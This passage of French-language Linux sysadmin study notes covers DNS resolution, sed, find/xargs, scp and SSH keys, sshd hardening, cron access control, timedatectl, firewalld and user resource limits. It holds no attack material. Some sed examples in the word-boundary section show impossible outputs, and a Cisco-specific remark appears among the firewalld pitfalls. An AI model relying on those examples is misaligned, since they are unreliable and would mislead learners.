```

**Problème : Résolution lente**
```bash
# Vérifier timeout DNS
time nslookup google.com

# Augmenter timeout resolv.conf
options timeout:5 attempts:2

# Activer rotation (load balance nameservers)
options rotate

# Utiliser DNS plus rapides
nameserver 1.1.1.1    # Cloudflare (souvent plus rapide)
```

**Problème : DNS pollués/bloqués**
```bash
# Utiliser DNS alternatifs
nameserver 1.1.1.1    # Cloudflare (pas de censure)
nameserver 8.8.8.8    # Google (neutre)
```

### Options resolv.conf avancées

```bash
# Timeout par nameserver (secondes)
options timeout:2

# Nombre tentatives par nameserver
options attempts:3

# Rotation nameservers (load balancing)
options rotate

# Single-request (évite problèmes IPv6)
options single-request

# Use-vc (force TCP au lieu UDP)
options use-vc

# Trust-ad (DNSSEC)
options trust-ad
```

### /etc/hosts (résolution statique)

**Use case :** Résolution locale sans DNS (prioritaire sur DNS).

```bash
sudo vi /etc/hosts

# Localhost
127.0.0.1   localhost
::1         localhost

# Résolution custom
192.168.1.10   db.local
192.168.1.20   web.local web
10.0.0.5       mail.corp.internal
```

**Priorité :** `/etc/hosts` consulté AVANT DNS (sauf config `nsswitch.conf` modifiée).

### ⚠️ Pitfalls

1. **`/etc/resolv.conf` écrasé par DHCP/NetworkManager** → Utiliser `chattr +i` ou config NetworkManager
2. **Trop de nameservers** → Système utilise max 3 premiers seulement
3. **DNS local offline** → Ajouter DNS public fallback (8.8.8.8)
4. **Oublier `search` directive** → Hostnames partiels pas résolus
5. **systemd-resolved actif** → `/etc/resolv.conf` souvent symlink (modifications perdues)
6. **Firewall bloque port 53** → DNS timeout
7. **IPv6 vs IPv4** → Option `single-request` résout problèmes

### Comparaison : /etc/hosts vs DNS

| Critère | `/etc/hosts` | DNS |
|---------|--------------|-----|
| Scope | Local machine | Global (réseau/internet) |
| Maintenance | Manuelle fichier | Centralisée serveurs DNS |
| Performance | Instantané (pas requête) | Latence réseau (~10-50ms) |
| Scalabilité | Petits réseaux | Milliers domaines |
| Use case | Tests, dev, override | Production, internet |

---

## Module 7 : Disques et systèmes de fichiers

### Commandes
```bash
df -h                            # Espace disque (h=human readable)
du -sh /var/log/*               # Taille répertoires
lsblk                            # Liste block devices
sudo fdisk -l                    # Liste partitions
mount                            # Afficher montages
sudo mount /dev/sdb1 /mnt        # Monter partition
sudo umount /mnt                 # Démonter
```

### fstab (montages automatiques)
```bash
sudo nano /etc/fstab
# Format : device  mountpoint  fstype  options  dump  pass
/dev/sdb1  /data  ext4  defaults  0  2
```

---

## Module 7bis : sed - Stream Editor (Challenge 11)

### Substitution basique
```bash
# Remplacer (stdout, fichier inchangé)
sed 's/old/new/g' file.txt

# In-place (modifier fichier)
sed -i 's/old/new/g' file.txt

# In-place avec backup
sed -i.bak 's/old/new/g' file.txt
# Crée file.txt.bak (original)
```

### Flags substitution
- `g` : Global (toutes occurrences ligne)
- `i` : Ignore case (case-insensitive)
- `2` : Remplacer 2ème occurrence seulement
- `p` : Print lignes modifiées

### Délimiteurs alternatifs (paths)
```bash
# Problème : escape slashes
sed 's/\/var\/www\/html/\/var\/www\/new/g' file.txt

# Solution : autre délimiteur (|, #, @)
sed 's|/var/www/html|/var/www/new|g' file.txt
sed 's#/var/www/html#/var/www/new#g' file.txt
```

### Word boundaries (Challenge 04 Level 2)

**Problème** : Remplacer mot complet sans altérer mots contenant la chaîne.

**Exemple** : Remplacer `from` → `their` sans toucher `fromage`, `perform`

```bash
# MAUVAIS : Altère tous "from" (y compris dans mots)
sed 's/from/their/g' file.txt
# "performance" → "perfortheirrmance" ❌

# BON : Word boundaries \< et \>
sed 's/\<from\>/their/g' file.txt
# "from" → "their" ✅
# "performance" → "performance" ✅
```

**Syntaxe** :
- `\<` : Début de mot (word boundary start)
- `\>` : Fin de mot (word boundary end)
- `\<pattern\>` : Match mot complet uniquement

**Exemples** :
```bash
# Supprimer lignes contenant mot "error" complet
sed '/\<error\>/d' logfile.txt
# Garde "errors", "error_code" (pas mot complet)

# Remplacer "to" par "from" (pas "into", "upto")
sed 's/\<to\>/from/g' file.txt

# Case sensitive par défaut
sed '/\<Software\>/d' file.txt  # Supprime "Software"
sed '/\<software\>/d' file.txt  # Supprime "software"
```

**Use case Challenge 04** :
```bash
# Tâche a : Supprimer lignes contenant "software" (case sensitive)
sed '/\<software\>/d' BSD.txt > BSD_DELETE.txt

# Tâche b : Remplacer "from" → "their" (mot complet)
sed 's/\<from\>/their/g' BSD.txt > BSD_REPLACE.txt
```

**⚠️ Pitfall** : Sans word boundaries, `sed 's/from/their/g'` altère "fromage" → "theirrmage" ❌

### Autres commandes utiles
```bash
# Supprimer lignes pattern
sed '/pattern/d' file.txt

# Supprimer lignes vides
sed '/^$/d' file.txt

# Afficher lignes 10-20
sed -n '10,20p' file.txt

# Multiple substitutions
sed -e 's/foo/bar/g' -e 's/old/new/g' file.txt
```

### Extended regex (-E)
```bash
# Basic (défaut) : échapper +, ?, {}, ()
sed 's/a\+/X/g' file.txt

# Extended (-E) : pas escape
sed -E 's/a+/X/g' file.txt
```

### Use cases professionnels
- Déploiement : remplacer placeholders configs (`{{VAR}}` → valeur)
- Migration : update paths/URLs dans fichiers multiples
- Anonymisation : masquer emails/IPs dans logs (RGPD)
- Refactoring : renommer variables/classes codebase

**⚠️ Pitfalls :**
- Oublier `/g` → remplace 1ère occurrence seulement
- Slash dans pattern → utiliser autre délimiteur
- Permissions fichier (backup échoue si read-only)

---

## Module 8 : Recherche et manipulation fichiers avancées

### Find - Recherche puissante (Challenge 6)

**Syntaxe de base :**
```bash
find [chemin] [critères] [actions]
```

**Critères essentiels :**
```bash
# Par nom
find /home -name "*.conf"              # Nom exact (case-sensitive)
find /etc -iname "*.CONF"              # Ignore case

# Par type
find /var -type f                      # f=fichier, d=directory, l=symlink

# Par ownership
find /data -user james                 # Fichiers user james
find /data -group developers           # Fichiers groupe developers
find /data -nouser                     # Fichiers orphelins (user supprimé)

# Par taille
find /var/log -size +100M              # > 100MB
find /tmp -size -1k                    # < 1KB

# Par date modification
find /backup -mtime -7                 # Modifiés derniers 7 jours
find /backup -mtime +30                # Modifiés il y a plus de 30 jours

# Combinaisons (AND implicite, OR avec -o)
find /home -user james -type f         # Fichiers ET user james
find /data \( -name "*.log" -o -name "*.tmp" \) -type f
```

**Actions sur résultats :**
```bash
# Exécuter commande par fichier (-exec)
find /tmp -type f -name "*.tmp" -exec rm {} \;
# {} = fichier courant, \; = fin commande
# ATTENTION : 1 processus par fichier (lent si beaucoup)

# Exécuter commande batch (+)
find /backup -type f -mtime +90 -exec rm {} +
# + = grouper fichiers en 1 seule commande (plus rapide)

# Confirmation interactive
find /data -name "*.bak" -ok rm {} \;
# Demande confirmation pour chaque fichier

# Affichage personnalisé
find /home -type f -printf "%p %s bytes\n"
# %p = path, %s = size, %u = user
```

**⚠️ Pièges courants :**
- **Chemins relatifs vs absolus** : `find .` cherche depuis répertoire courant
- **Permissions** : Besoin `sudo` pour traverser répertoires protégés
- **Performance** : `-type f` AVANT `-name` (plus rapide)
- **Espaces dans noms** : Utiliser `-print0` + `xargs -0` (voir ci-dessous)

---

### Xargs - Construire commandes depuis stdin (Challenge 6)

**Problème résolu :**
`find` génère liste de fichiers → `xargs` convertit en arguments pour commande.

**Syntaxe de base :**
```bash
find . -type f | xargs commande
```

**Différence clé `-exec` vs `xargs` :**

| Critère | find -exec | find \| xargs |
|---------|------------|---------------|
| Processus | 1 par fichier | Batch groupé |
| Performance | Lent (100+ fichiers) | Rapide |
| Syntaxe | find ... -exec cmd {} \; | find ... \| xargs cmd |
| Use case | Commandes complexes/fichier | Opérations simples batch |

**Exemple Challenge 6 :**
```bash
# ❌ ERREUR : -exec ne crée pas parents
find . -user james -type f -exec cp --parents {} /media \;

# ✅ SOLUTION : xargs permet à cp de créer arborescence
find . -user james -type f | xargs cp -a --parents --no-clobber -t /media
```

**Options xargs essentielles :**
```bash
# -t : afficher commande avant exécution (debug)
find . -type f | xargs -t rm

# -n N : max N arguments par commande
echo "1 2 3 4 5" | xargs -n 2 echo
# Output : 1 2
#          3 4
#          5

# -I {} : remplacer placeholder (comme -exec)
find . -name "*.txt" | xargs -I {} mv {} {}.bak

# -p : confirmation interactive
find . -name "*.tmp" | xargs -p rm

# -0 : lire entrées séparées par null (gestion espaces)
find . -type f -print0 | xargs -0 rm
```

**Gestion fichiers avec espaces/caractères spéciaux :**
```bash
# ❌ CASSE avec "my file.txt" (espace)
find . -type f | xargs rm

# ✅ SOLUTION : -print0 + xargs -0
find . -type f -print0 | xargs -0 rm

# Explication :
# -print0 : sépare résultats par \0 (null byte) au lieu de \n (newline)
# xargs -0 : lit entrées séparées par \0
```

---

### CP avancé - Préserver arborescence (Challenge 6)

**Options cp critiques :**

**`cp -a` (archive mode) :**
```bash
cp -a source/ destination/
# Équivalent : cp -dR --preserve=all
# Préserve : permissions, ownership, timestamps, symlinks, attributs étendus
# Use case : backups, migrations, forensics
```

**`cp --parents` (CLEF Challenge 6) :**
```bash
# Sans --parents (écrase tout dans /backup)
cp /home/user/docs/report.pdf /backup
# Résultat : /backup/report.pdf

# Avec --parents (recrée arborescence)
cp --parents /home/user/docs/report.pdf /backup
# Résultat : /backup/home/user/docs/report.pdf

# Avec chemins relatifs (MEILLEUR)
cd /home/user
cp --parents docs/report.pdf /backup
# Résultat : /backup/docs/report.pdf
```

**`cp --no-clobber` (sécurité) :**
```bash
cp --no-clobber source dest
# Ne pas écraser fichier existant destination
# Évite pertes données accidentelles
```

**`cp -t /destination` (syntaxe inversée pour xargs) :**
```bash
# Syntaxe classique : cp SOURCE... DEST
cp file1 file2 file3 /destination

# Syntaxe -t : cp -t DEST SOURCE...
cp -t /destination file1 file2 file3

# Pourquoi ? Compatible avec xargs (DEST avant SOURCES)
find . -type f | xargs cp -t /destination
```

**Commande complète Challenge 6 décomposée :**
```bash
sudo find . -user james -type f | xargs cp -a --parents --no-clobber -t /media
│    │    │  │          │        │     │   │  │          │             │  │
│    │    │  │          │        │     │   │  │          │             │  └─ Destination
│    │    │  │          │        │     │   │  │          │             └─ Syntaxe inversée (dest avant sources)
│    │    │  │          │        │     │   │  │          └─ Ne pas écraser existants
│    │    │  │          │        │     │   │  └─ Préserver arborescence répertoires
│    │    │  │          │        │     │   └─ Mode archive (preserve all)
│    │    │  │          │        │     └─ Batch operation (grouper fichiers)
│    │    │  │          │        └─ Pipe vers xargs
│    │    │  │          └─ Uniquement fichiers (pas directories)
│    │    │  └─ User james
│    │    └─ Depuis répertoire courant
│    └─ Commande find
└─ Permissions admin (traverser tous répertoires)
```

**Application pro :**
- **Migration données** : copier fichiers user entre serveurs
- **Backup sélectif** : sauvegarder uniquement fichiers récents/user spécifique
- **Forensics** : collecter preuves (préserver métadonnées timestamps)
- **Cleanup** : archiver puis supprimer fichiers anciens

---

## Module 8bis : scp - Secure File Transfer (Challenge 12)

### Syntaxe basique
```bash
# Local → Remote
scp /local/file.txt user@remote:/path/

# Remote → Local
scp user@remote:/remote/file.txt /local/path/

# Répertoire (récursif)
scp -r /local/dir user@remote:/path/
```

### Options importantes
- `-r` : Récursif (répertoires)
- `-p` : Préserver timestamps/permissions
- `-C` : Compression (gzip pendant transfert)
- `-P PORT` : Port SSH custom
- `-i keyfile` : Clé SSH spécifique
- `-l LIMIT` : Limiter bande passante (Kbit/s)

### scp vs rsync vs sftp

| Outil | Use case | Avantages | Inconvénients |
|-------|----------|-----------|---------------|
| **scp** | Transfert simple one-shot | Simple, rapide, partout | Pas delta, retransfère tout |
| **rsync** | Sync, backups incrémentaux | Delta transfer (différences) | Syntaxe complexe |
| **sftp** | Transfert interactif | Interface FTP-like | Moins efficace scripts |

### Vérifier intégrité
```bash
# Checksum source
md5sum /local/file.txt
# abc123...

# Checksum destination
ssh user@remote "md5sum /remote/file.txt"
# abc123...  (doit matcher)
```

### rsync (alternative puissante)
```bash
# Sync delta (seulement fichiers modifiés)
rsync -avz /local/dir/ user@remote:/remote/dir/
# -a : archive (preserve all)
# -v : verbose
# -z : compression

# Mirror exact (supprime fichiers destination absents source)
rsync -avz --delete /local/ user@remote:/remote/
```

### SSH Keys (passwordless) - Challenge 05 Level 2

**Concept** : Authentification SSH par clés publique/privée (sans mot de passe).

**Avantages** :
- Automation scripts (cron, CI/CD, orchestration Ansible)
- Sécurité renforcée (clé privée ≠ password crackable)
- Confort utilisateur (pas de saisie répétée)

**Workflow** :

#### 1. Générer paire clés SSH

```bash
ssh-keygen -t ed25519
```

**Options** :
- `-t ed25519` : Algorithme moderne (recommandé vs RSA)
  * Ed25519 : Plus rapide, clés plus courtes (256-bit), sécurité équivalente RSA 3072-bit
  * RSA : Ancien standard (`-t rsa -b 4096` pour 4096-bit)
- `-f ~/.ssh/id_custom` : Fichier personnalisé (défaut `~/.ssh/id_ed25519`)
- `-C "comment"` : Commentaire (ex: email)

**Prompts** :
```bash
Enter file in which to save the key (/home/user/.ssh/id_ed25519): [Enter]
Enter passphrase (empty for no passphrase): [Enter si password-less]
Enter same passphrase again: [Enter]
```

**Résultat** :
- `~/.ssh/id_ed25519` : Clé privée (SECRET, permissions `600`)
- `~/.ssh/id_ed25519.pub` : Clé publique (partageable)

#### 2. Copier clé publique vers serveur distant

**Méthode automatique (recommandée)** :
```bash
ssh-copy-id user@remote_host
```

**Explication** :
- Copie `~/.ssh/id_ed25519.pub` vers `~/.ssh/authorized_keys` sur serveur distant
- Configure permissions correctes automatiquement (`700` ~/.ssh, `600` authorized_keys)
- Prompt mot de passe distant (dernière fois)

**Méthode manuelle** :
```bash
cat ~/.ssh/id_ed25519.pub | ssh user@remote 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'
```

**Use case Challenge 05** :
```bash
# Jump host → 3 app servers password-less
ssh-keygen -t ed25519          # Générer clé (passphrase vide)
ssh-copy-id tony@stapp01       # Copier vers App Server 1
ssh-copy-id steve@stapp02      # Copier vers App Server 2
ssh-copy-id banner@stapp03     # Copier vers App Server 3
```

#### 3. Test connexion password-less

```bash
ssh user@remote_host
# Connexion directe sans prompt password ✅
```

**Debugging** :
```bash
# Verbose mode (troubleshooting)
ssh -v user@remote_host

# Vérifier permissions clé privée
ls -l ~/.ssh/id_ed25519
# -rw------- (600) requis, sinon SSH refuse

# Vérifier authorized_keys serveur distant
ssh user@remote 'cat ~/.ssh/authorized_keys'
```

**Sécurité** :

**Passphrase clé privée** :
- **Avec passphrase** : Clé chiffrée (sécurité si vol fichier), prompt à chaque usage
- **Sans passphrase** : Automation possible (scripts cron), risque si compromission serveur

**ssh-agent (meilleur des deux mondes)** :
```bash
# Démarrer agent
eval $(ssh-agent)

# Ajouter clé (prompt passphrase 1 fois)
ssh-add ~/.ssh/id_ed25519

# Connexions suivantes : pas de prompt (agent garde clé déverrouillée)
ssh user@remote
```

**Alternatives algorithmes** :

| Algorithme | Taille clé | Sécurité | Performance | Recommandation |
|------------|------------|----------|-------------|----------------|
| **Ed25519** | 256-bit | Excellente | Très rapide | ✅ Recommandé (moderne) |
| RSA | 2048-bit | Bonne | Rapide | ⚠️ Minimum acceptable |
| RSA | 4096-bit | Excellente | Lent | ✅ Acceptable (legacy) |
| ECDSA | 256-521-bit | Bonne | Rapide | ⚠️ Préférer Ed25519 |
| DSA | 1024-bit | ❌ Faible | - | ❌ Obsolète (éviter) |

**Use cases professionnels** :
- **Automation** : Scripts cron, CI/CD pipelines (Jenkins, GitLab CI)
- **Orchestration** : Ansible, Terraform, Puppet (gestion serveurs)
- **Backup** : rsync automatisés (password-less)
- **Git** : Push/pull sans password (GitHub/GitLab SSH keys)
- **Jump hosts** : Bastion servers accès multi-serveurs

**⚠️ Pitfalls** :
- Permissions incorrectes (`chmod 600` clé privée, `700` ~/.ssh, `600` authorized_keys)
- Clé publique corrompue (whitespace, line breaks)
- SELinux/AppArmor bloquent accès `~/.ssh` (restorecon, audit2allow)
- Multiple clés : spécifier avec `ssh -i ~/.ssh/id_custom user@remote`

**⚠️ Pitfalls (général) :**
- Oublier `:` avant path remote → erreur "No such file"
- Confusion `-p` (preserve) vs `-P` (port)
- Trailing slash rsync : `/dir/` vs `/dir` = comportement différent

---

## Module 9 : Sécurité SSH

### Configuration sshd (Challenge 7)

**Fichier principal :** `/etc/ssh/sshd_config`

**Directives sécurité essentielles :**
```bash
# Désactiver login root direct (BEST PRACTICE)
PermitRootLogin no

# Valeurs possibles PermitRootLogin :
# - yes : autorisé (❌ DANGER prod)
# - no : interdit (✅ RECOMMANDÉ)
# - prohibit-password : clé SSH uniquement (automation Ansible/Terraform)
# - forced-commands-only : commandes forcées uniquement (cas avancés)

# Désactiver auth password (forcer clés SSH)
PasswordAuthentication no
PubkeyAuthentication yes

# Limiter users/groups autorisés
AllowUsers tony steve banner
AllowGroups sysadmins

# Port non-standard (éviter scans automatisés)
Port 2222

# Protocole SSH v2 uniquement (v1 obsolète vulnérable)
Protocol 2

# Timeout sessions idle
ClientAliveInterval 300         # Ping client toutes les 300s
ClientAliveCountMax 2           # Déconnecter après 2 pings sans réponse

# Limiter tentatives auth
MaxAuthTries 3
MaxSessions 10

# Désactiver features non utilisées
X11Forwarding no
PermitEmptyPasswords no
AllowTcpForwarding no
```

**Workflow sécurisé édition sshd_config :**
```bash
# 1. Backup config actuelle
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# 2. Éditer config
sudo vi /etc/ssh/sshd_config

# 3. TESTER syntaxe AVANT restart (CRITIQUE!)
sudo sshd -t
# Si OK : aucun output
# Si erreur : affiche ligne problème

# 4. Redémarrer service
sudo systemctl restart sshd

# 5. GARDER session actuelle ouverte + ouvrir NOUVELLE session test
ssh user@serveur
# Si nouvelle session OK → fermer ancienne
# Si lockout → console physique/série pour rollback
```

**Pourquoi désactiver root SSH ?**

❌ **Risques :**
- **Brute-force facilité** : login "root" connu universellement
- **Traçabilité impossible** : plusieurs admins = même user root
- **Pas de double auth** : accès total direct sans checkpoint sudo
- **Non-conformité** : PCI-DSS, ISO 27001, SOC 2 exigent désactivation

✅ **Bonne pratique :**
1. Connexion SSH user nominatif (tony, steve, alice, bob)
2. Élévation privilèges via `sudo` (tracé `/var/log/auth.log`)
3. Audit forensics : savoir QUI a fait QUOI et QUAND

**Logs SSH debugging :**
```bash
# Debian/Ubuntu
sudo tail -f /var/log/auth.log

# RedHat/CentOS/Rocky
sudo tail -f /var/log/secure

# Filtrer tentatives failed
sudo grep "Failed password" /var/log/auth.log | tail -20

# Identifier IPs brute-force
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
```

**Protection brute-force :**
```bash
# Installer fail2ban
sudo apt install fail2ban

# Configurer jail SSH
sudo vi /etc/fail2ban/jail.local
---
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600
---

# Démarrer fail2ban
sudo systemctl enable --now fail2ban

# Vérifier bans actifs
sudo fail2ban-client status sshd
```

---

## Astuces / Bonnes pratiques

1. **Toujours lire la manpage** : `man commande`
2. **Utiliser `--help`** : `ls --help` pour aide rapide
3. **History** : `history | grep ssh` pour retrouver commandes
4. **Alias utiles** :
   ```bash
   alias ll='ls -lah'
   alias ..='cd ..'
   ```
5. **Ctrl+R** : Recherche inversée dans l'historique
6. **Ctrl+C** : Interrompre commande en cours
7. **Ctrl+Z** : Mettre en background (puis `bg` pour continuer)
8. **Sauvegarder avant modifs critiques** : `sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak`

---

## TODO / À approfondir

- [ ] Scripts bash avancés (boucles, conditions)
- [ ] Cron jobs (automatisation tâches)
- [ ] SSH tunneling et port forwarding
- [ ] LVM (Logical Volume Management)
- [ ] SELinux / AppArmor

---

---

## Module 12 : Cron Access Control (Challenge 13)

### Fichiers configuration
- `/etc/cron.allow` : Whitelist (seuls users listés autorisés)
- `/etc/cron.deny` : Blacklist (tous autorisés SAUF listés)

### Logique priorité
```
Si cron.allow existe → Whitelist mode (seuls listés autorisés)
Sinon, si cron.deny existe → Blacklist mode (tous SAUF listés)
Sinon → Root only (défaut RHEL/CentOS)
```

### Autoriser user
```bash
# Ajouter à whitelist
echo "username" | sudo tee -a /etc/cron.allow

# Permissions CRITIQUES (must be readable)
sudo chmod 644 /etc/cron.allow

# Redémarrer service
sudo systemctl restart crond  # RHEL/CentOS
sudo systemctl restart cron   # Debian/Ubuntu
```

### Bloquer user
```bash
# Ajouter à blacklist
echo "username" | sudo tee -a /etc/cron.deny

# Permissions
sudo chmod 644 /etc/cron.deny

# Restart
sudo systemctl restart crond
```

### Tester accès
```bash
# Test user autorisé
sudo -u username crontab -l
# no crontab for username  (OK)

# Test user bloqué
sudo -u blocked crontab -l
# You (blocked) are not allowed to use this program (crontab)
```

### Lister tous crontabs système
```bash
for user in $(cut -d: -f1 /etc/passwd); do
  sudo crontab -u $user -l 2>/dev/null && echo "=== $user ==="
done
```

### Best practices sécurité
- **Whitelist mode** (cron.allow) recommandé production
- **Permissions 644** obligatoires (cron daemon doit lire)
- **Audit régulier** : lister crontabs suspectes
- **Bloquer service accounts** (nginx, apache, mysql dans cron.deny)
- **Logs** : `/var/log/cron` (RHEL) ou `/var/log/syslog` (Debian)

### Debugging
```bash
# Vérifier configuration
ls -l /etc/cron.{allow,deny}
cat /etc/cron.allow

# Status service
sudo systemctl status crond

# Logs
sudo tail -f /var/log/cron           # RHEL
sudo grep CRON /var/log/syslog       # Debian
```

**⚠️ Pitfalls :**
- Permissions 600 → cron daemon ne peut pas lire → tous bloqués
- Oublier restart service après modifications
- Nom service : `crond` (RHEL) vs `cron` (Debian)

---

## Module 13 : Time Management (timedatectl) - Challenge 15

### Voir status complet
```bash
timedatectl status
# (ou simplement : timedatectl)
```

**Output :**
```
               Local time: Tue 2026-01-06 07:45:32 -03
           Universal time: Tue 2026-01-06 10:45:32 UTC
                 RTC time: Tue 2026-01-06 10:45:32
                Time zone: America/Argentina/Mendoza (-03, -0300)
System clock synchronized: yes
              NTP service: active
          RTC in local TZ: no
```

### Changer timezone
```bash
# Définir timezone système
sudo timedatectl set-timezone America/Argentina/Mendoza
sudo timedatectl set-timezone Europe/Paris
sudo timedatectl set-timezone UTC

# Lister timezones disponibles
timedatectl list-timezones

# Filtrer par région
timedatectl list-timezones | grep America
timedatectl list-timezones | grep Europe/
```

### Formats timezone IANA
- **Structure** : `Continent/City` ou `Continent/Region/City`
- **Exemples** :
  * `Europe/Paris` : France (GMT+1, DST → GMT+2)
  * `America/New_York` : USA East Coast (GMT-5, DST → GMT-4)
  * `America/Argentina/Mendoza` : Argentine (GMT-3, pas DST)
  * `Asia/Tokyo` : Japon (GMT+9, pas DST)
  * `UTC` : Référence universelle

**⚠️ Éviter abréviations :** EST ambigu (USA -5 ou Australie +10 ?)

### NTP (Network Time Protocol)
```bash
# Activer synchronisation NTP
sudo timedatectl set-ntp true

# Désactiver NTP (heure manuelle)
sudo timedatectl set-ntp false

# Définir heure manuellement (NTP doit être off)
sudo timedatectl set-time "2026-01-06 15:30:00"

# Vérifier sync NTP
timedatectl timesync-status  # systemd-timesyncd
chronyc sources              # chronyd
```

### Hardware Clock (RTC)
```bash
# Lire horloge matérielle
sudo hwclock --show

# Sync system clock → RTC
sudo hwclock --systohc

# Sync RTC → system clock
sudo hwclock --hctosys

# RTC stocke UTC (recommandé) ou local time
timedatectl status | grep "RTC in local TZ"
# RTC in local TZ: no  ← UTC (best practice)
```

### Fichiers configuration
```bash
# Symlink timezone système
ls -l /etc/localtime
# lrwxrwxrwx /etc/localtime -> /usr/share/zoneinfo/America/Argentina/Mendoza

# Méthode manuelle (alternative timedatectl)
sudo ln -sf /usr/share/zoneinfo/TIMEZONE /etc/localtime
```

### Use cases professionnels
- **Multi-régions** : Tous serveurs UTC (logs cohérents, pas confusion DST)
- **Logs analysis** : Timezones synchronisées = correlation facile
- **Compliance PCI-DSS** : NTP sync obligatoire (max 5min drift)
- **Cron tasks** : Attention timezone impacte horaires exécution

### Alternatives commande
- `tzselect` : Interactif **user** (variable shell TZ, pas système)
- `timedatectl` : Admin **système** (permanent, gère NTP/RTC)

**⚠️ Pitfalls :**
- `apropos timezone` ne liste pas timedatectl (description man pas keyword)
- `tzselect` modifie seulement variable shell (pas persistent)
- Changement timezone impacte cron (horaires décalés)

---

## Module 14 : Firewall (firewalld) - Challenge 16

### Gestion zones

**Zones = profils sécurité** (trust croissant) :

| Zone | Trust | Usage | Règles défaut |
|------|-------|-------|---------------|
| drop | 0% | Attaque | Tout DROP (silencieux) |
| block | 5% | Hostile | Tout REJECT (ICMP unreachable) |
| **public** | 10% | Internet | SSH + services explicites |
| dmz | 20% | DMZ | Services publics limités |
| work | 60% | Bureau | Services internes |
| home | 80% | Maison | Services + mDNS |
| internal | 90% | LAN privé | Large gamme services |
| trusted | 100% | Confiance | Tout ACCEPT |

**Commandes zones :**
```bash
# Zone par défaut
firewall-cmd --get-default-zone

# Zones actives (avec interfaces)
firewall-cmd --get-active-zones

# Lister règles zone
firewall-cmd --zone=public --list-all

# Changer zone interface
sudo firewall-cmd --permanent --zone=dmz --change-interface=eth0
```

---

### Gestion ports

```bash
# Ajouter port (permanent + reload)
sudo firewall-cmd --permanent --zone=public --add-port=8087/tcp
sudo firewall-cmd --reload

# Ajouter port range
sudo firewall-cmd --permanent --add-port=8000-8100/tcp

# Retirer port
sudo firewall-cmd --permanent --remove-port=8087/tcp

# Lister ports ouverts
firewall-cmd --zone=public --list-ports
```

---

### Gestion services

**Services = abstraction ports** (http = 80/tcp, https = 443/tcp).

```bash
# Lister services disponibles
firewall-cmd --get-services

# Ajouter service
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --permanent --add-service=https

# Retirer service
sudo firewall-cmd --permanent --remove-service=http

# Lister services actifs
firewall-cmd --zone=public --list-services
```

**Fichiers services :** `/usr/lib/firewalld/services/*.xml`

---

### Runtime vs Permanent

**2 configurations parallèles :**

**Runtime (mémoire) :**
- Actif actuellement (perdu reload/reboot)
- Modifié sans `--permanent`

**Permanent (fichiers XML) :**
- Stocké `/etc/firewalld/zones/*.xml`
- Modifié avec `--permanent` (appliqué après `--reload`)

**Best practice :**
```bash
# 1. Ajouter permanent
sudo firewall-cmd --permanent --add-port=8087/tcp

# 2. Recharger (applique permanent → runtime)
sudo firewall-cmd --reload
```

---

### Rich rules (avancé)

**Filtrage granulaire** (source IP, logging, rate limiting).

```bash
# Autoriser port depuis IP spécifique
sudo firewall-cmd --permanent --add-rich-rule='
  rule family="ipv4"
  source address="10.0.0.50"
  port port="8087" protocol="tcp"
  accept
'

# Logger connexions
sudo firewall-cmd --permanent --add-rich-rule='
  rule port port="8087" protocol="tcp"
  log prefix="PORT-8087: " level="info"
  accept
'

# Lister rich rules
firewall-cmd --list-rich-rules
```

**Logs :** `journalctl -k | grep PORT-8087`

---

### Vérification / Debugging

```bash
# État firewalld
sudo firewall-cmd --state

# Recharger config
sudo firewall-cmd --reload

# Recharger complet (coupe connexions)
sudo firewall-cmd --complete-reload

# Logs firewalld
sudo journalctl -u firewalld -f

# Logs kernel (drops)
sudo journalctl -k | grep -i firewall
```

**Tester port (depuis client) :**
```bash
telnet <server> 8087
nc -zv <server> 8087
curl http://<server>:8087
```

---

### Use cases pros

**Serveur Web DMZ :**
```bash
sudo firewall-cmd --permanent --zone=dmz --change-interface=eth0
sudo firewall-cmd --permanent --zone=dmz --add-service=http
sudo firewall-cmd --permanent --zone=dmz --add-service=https
sudo firewall-cmd --reload
```

**Database (PostgreSQL 5432 depuis app servers 10.0.1.0/24 uniquement) :**
```bash
sudo firewall-cmd --permanent --add-rich-rule='
  rule family="ipv4"
  source address="10.0.1.0/24"
  port port="5432" protocol="tcp"
  accept
'
sudo firewall-cmd --reload
```

**Router NAT (masquerading LAN → WAN) :**
```bash
sudo firewall-cmd --permanent --zone=public --add-masquerade
sudo sysctl -w net.ipv4.ip_forward=1
```

---

**⚠️ Pitfalls :**
- Oublier `--reload` après `--permanent` → règle pas appliquée runtime
- `--complete-reload` coupe connexions SSH (danger distant)
- `service password-encryption` Type 7 **réversible** (pas vraie sécurité, juste masquage)

---

## Module 17 : Limites de Ressources Utilisateur (ulimit / limits.conf)

### Concepts clés

**Problème :** Utilisateur peut consommer ressources illimitées → dégradation performances système.

**Solution :** Définir **resource limits** par utilisateur/groupe dans `/etc/security/limits.conf`.

### Types de limites

| Type | Description | Modifiable par user ? |
|------|-------------|-----------------------|
| **soft** | Limite par défaut (warning) | ✅ Oui (jusqu'à hard) |
| **hard** | Limite maximale absolue | ❌ Non (sauf root) |

### Ressources limitables

| Ressource | Code | Description | Use case |
|-----------|------|-------------|----------|
| **nproc** | `nproc` | Nombre max processus | Limiter fork bombs, users serveurs |
| **nofile** | `nofile` | Nombre max fichiers ouverts | Applications haute concurrence (nginx, DB) |
| **fsize** | `fsize` | Taille max fichier (KB) | Éviter remplissage disque logs |
| **memlock** | `memlock` | Mémoire verrouillable (KB) | Applications temps réel |
| **cpu** | `cpu` | Temps CPU (minutes) | Limiter processus long-running |
| **stack** | `stack` | Taille stack (KB) | Éviter stack overflow |

### Configuration /etc/security/limits.conf

**Format :**
```
<domain>   <type>   <item>   <value>
```

**Exemples :**

```bash
# Limiter processus user nfsuser (Challenge 17)
nfsuser          soft    nproc           1027
nfsuser          hard    nproc           2025

# Limiter fichiers ouverts pour serveur web
www-data         soft    nofile          4096
www-data         hard    nofile          8192

# Limiter groupe developers
@developers      soft    nproc           100
@developers      hard    nproc           200

# Limiter TOUS les users (wildcard)
*                soft    nproc           1024
*                hard    nproc           2048

# Limiter taille fichiers logs
syslog           hard    fsize           1048576   # 1GB en KB
```

### Commandes ulimit (vérification/temporaire)

**Afficher limites actuelles :**
```bash
ulimit -a                  # Toutes limites
